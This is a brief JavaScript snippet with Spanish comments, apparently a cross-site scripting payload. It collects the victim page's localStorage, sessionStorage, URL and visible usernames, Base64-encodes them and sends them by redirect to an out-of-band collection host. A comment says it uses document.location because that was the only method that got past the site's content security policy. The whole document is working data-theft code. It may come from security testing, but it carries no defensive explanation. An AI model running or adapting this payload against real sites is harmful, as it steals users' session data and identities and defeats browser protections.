// Recolectamos todo lo que no sea una cookie protegida
let info = {
    local: localStorage,
    session: sessionStorage,
    url: document.URL,
    user: document.body.innerText.match(/Usuario: .*/g) // Intenta buscar nombres de usuario en el texto
};

// Lo convertimos a Base64
let encodedData = btoa(JSON.stringify(info));

// Usamos document.location porque es lo único que saltó tu CSP
window.location = "https://wedwqcbkveknzrplplbbf2thxekxhd8hu.oast.fun/exfil?d=" + encodedData;